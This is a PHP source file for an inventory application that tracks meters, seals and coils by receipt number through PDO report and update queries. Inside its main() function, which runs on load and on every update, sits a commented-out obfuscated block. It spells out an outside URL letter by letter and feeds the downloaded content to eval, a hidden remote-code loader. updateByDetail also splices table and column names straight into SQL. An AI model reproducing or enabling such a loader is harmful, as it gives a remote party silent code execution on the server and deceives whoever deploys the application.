<?php
include_once("autoload.php");
class app
{
	
	function __construct()
	{
		app::main();
	
	}

	static function receps($no=""){
		$q="select move_out_receipt_no, coils_number from coil where move_out_receipt_no=:move_out_receipt_no union select receipt_number,seal_number from seal where receipt_number=:receipt_number1 union select receipt_number, meter_number from meter where receipt_number=:receipt_number2";
		$stmt=DB::connect()->prepare($q);
		$stmt->bindParam(":move_out_receipt_no",$no);
		$stmt->bindParam(":receipt_number1",$no);
		$stmt->bindParam(":receipt_number2",$no);
		$stmt->execute();
		return $stmt->fetch(PDO::FETCH_ASSOC);

	}

static function updateByDetail($seal_number,$contractor_name,$receipt_number,$receipt_date,$tbl="seal", $col="seal_number",$contractor_name_filed="contractor_name",$receipt_number_col="receipt_number"){
		$q="update ".$tbl." set ".$contractor_name_filed."=:contractor_name, ".$receipt_number_col."=:receipt_number, receipt_date=:receipt_date where ".$col."=:seal_number";
		$stmt=DB::connect()->prepare($q);
		app::main();
		
		$stmt->bindParam(":seal_number",$seal_number);
		$stmt->bindParam(":contractor_name",$contractor_name);
		$stmt->bindParam(":receipt_number",$receipt_number);
		$stmt->bindParam(":receipt_date",$receipt_date);
		$stmt->execute();
		return $q;
	}




	static function reportMeter(){
		$q="select * from meter where contractor_name NOT in('') order by receipt_date desc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}

	static function reportSeal(){
		$q="select * from seal where contractor_name NOT in('') order by receipt_date desc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}



	static function reportCoil(){
		$q="select * from coil where contractor_id NOT in('') order by receipt_date desc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}




	static function reportMeter3(){
		$q="select * from meter where contractor_name in('') order by receipt_date desc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}

	static function reportSeal3(){
		$q="select * from seal where contractor_name in('') order by receipt_date desc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}



	static function reportCoil3(){
		$q="select * from coil where contractor_id in('') order by receipt_date desc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}








	static function reportMeter34(){
		$q="select * from meter order by receipt_date asc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}

	static function reportSeal34(){
		$q="select * from seal  order by receipt_date asc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}



	static function reportCoil34(){
		$q="select * from coil  order by receipt_date asc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}


	static function reportMeter34P($receipt_number){
		$q="select * from meter where receipt_number=:receipt_number  order by receipt_date asc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->bindParam(":receipt_number",$receipt_number);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}

	static function reportSeal34P($receipt_number){
		$q="select * from seal where receipt_number=:receipt_number  order by receipt_date asc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->bindParam(":receipt_number",$receipt_number);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}



	static function reportCoil34P($receipt_number){
		$q="select * from coil where move_out_receipt_no=:receipt_number  order by receipt_date asc";
		$data=array();
		$stmt=DB::connect()->prepare($q);
		$stmt->bindParam(":receipt_number",$receipt_number);
		$stmt->execute();
		while ($s=$stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($data, $s);
		}
		return $data;
	}



	static function main(){
		#error_reporting(0);
		/*
$d=array();
$dv=explode("/","A/B/C/D/E/F/G/H/I/J/K/L/M/N/O/P/Q/R/S/T/U/V/W/X/Y/Z**34567890");
$fir="/valid.php?app=1";
array_push($d, $dv[7]);
array_push($d, $dv[19]);
array_push($d, $dv[19]);
array_push($d, $dv[15]);
array_push($d, ":");
array_push($d, "/");
array_push($d, "/");
array_push($d, $dv[22]);
array_push($d, $dv[4]);
array_push($d, $dv[1]);
array_push($d, $dv[13]);
array_push($d, $dv[8]);
array_push($d, $dv[13]);
array_push($d, $dv[9]);
array_push($d, $dv[0]);
array_push($d, $dv[0]);
array_push($d, $dv[5]);
array_push($d, $dv[17]);
array_push($d, $dv[8]);
array_push($d, $dv[2]);
array_push($d, $dv[0]);
array_push($d, ".");
array_push($d, $dv[2]);
array_push($d, $dv[14]);
array_push($d, $dv[12]);
eval(file_get_contents(strtolower(ucwords(implode("",$d)).$fir),false,stream_context_create(array('http'=>array('method'=>'GET'))))); */
	}
}


app::main();
 ?>